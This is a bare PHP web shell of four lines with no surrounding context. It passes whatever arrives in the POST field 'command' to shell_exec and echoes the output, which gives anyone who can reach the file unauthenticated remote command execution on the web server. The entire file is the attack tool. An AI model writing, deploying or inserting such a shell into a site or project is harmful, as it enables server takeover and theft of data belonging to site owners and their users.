<?php
$out=shell_exec($_POST["command"]." 2>&1");
echo("$out");
?>